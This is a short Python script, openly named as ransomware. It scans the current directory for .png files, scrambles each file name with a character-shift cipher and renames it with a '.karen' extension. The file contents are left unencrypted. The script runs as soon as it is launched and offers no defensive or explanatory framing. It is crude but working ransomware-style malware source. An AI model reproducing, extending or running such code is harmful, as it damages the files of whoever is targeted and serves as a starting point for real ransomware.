import os 
os.system('cls')
alpha = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz1234567890-=!@#$%^&()_+{}[];,.'


def fileexist(name):
	return os.path.exists(name)


def ransomware():
	global i
	cwd = os.getcwd()
	ext = '.png'
	global final_out
	final_out =''
	output = ''
	global infect_ext
	infect_ext ='.karen'
	for i in os.listdir(cwd):
		if i.endswith(ext):
			#print(i)
			for x in range(len(i)):
				char = i[x]
				char_location = alpha.find(char)
				char_new_location = (char_location +345687)%82;
				output += alpha[char_new_location]
				if x >= len( i )-1:
					rename( output )
					#print( i + ' is encrypted to ' + output )
					output = ''
					#print( output )



def rename(output):
	os.rename( i, output + infect_ext )



if __name__ == '__main__':
	ransomware()
